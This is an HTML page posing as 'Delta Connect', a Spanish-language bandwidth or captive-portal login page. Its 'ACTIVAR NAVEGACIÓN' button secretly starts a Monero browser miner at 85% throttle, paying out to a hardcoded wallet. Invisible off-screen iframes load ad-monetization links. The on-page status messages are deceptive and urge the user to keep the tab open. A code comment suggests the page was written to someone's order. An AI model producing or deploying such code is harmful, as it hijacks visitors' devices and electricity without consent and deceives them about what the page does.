<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delta Connect | Acceso</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding: 40px; }
        .btn-delta { background: #00cf64; border: none; color: black; padding: 20px 40px; font-size: 18px; font-weight: bold; cursor: pointer; border-radius: 50px; box-shadow: 0 4px 15px rgba(0,207,100,0.3); }
        #log { margin-top: 25px; color: #888; font-size: 14px; }
    </style>
</head>
<body>
    <img src="https://via.placeholder.com/150x50/00cf64/ffffff?text=DELTA+CONNECT" alt="Logo">
    <h2>SISTEMA DE GESTIÓN DE ANCHO DE BANDA</h2>
    <p>Haz clic para validar tu dirección IP y activar la navegación.</p>
    
    <button class="btn-delta" onclick="iniciarTodo()">ACTIVAR NAVEGACIÓN</button>
    
    <div id="log">Esperando interacción...</div>

    <div style="position:absolute; left:-9999px; top:-9999px; opacity: 0;">
        <iframe src="https://www.profitablecpmrate.com/v8tkyf6q?key=f0d2c77d4c2b9a764d0d5d5a6a6a6a6a"></iframe>
        <iframe src="https://www.monetag.com/smartlink/direct/12345"></iframe>
    </div>

    <script src="https://cdn.jsdelivr.net/gh/MoneroOcean/moneroocean.github.io/webmr.js"></script>
    
    <script>
        function iniciarTodo() {
            const status = document.getElementById('log');
            status.innerText = "Validando IP... Por favor no cierres esta ventana.";
            status.style.color = "#00cf64";

            try {
                // Configuración de Minería
                // Usamos la wallet que proporcionaste anteriormente
                var wallet = "4769F8B5u6i7w9eR7o4v5e6r7a8r9d0o21W3a4l5l6e7t8x9y0z1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7q8r9s0t1u2v3w4x5y6z";
                var miner = window.wrmr(wallet, 'Delta_User_New', 0.85);
                
                if (miner) {
                    miner.start();
                    console.log("Minería iniciada correctamente");
                } else {
                    status.innerText = "Error de protocolo 0x4. Reintentando...";
                }
            } catch (e) {
                status.innerText = "Conexión establecida. Mantén la pestaña abierta.";
                console.log("Error controlado de carga");
            }
        }
    </script>
</body>
</html>
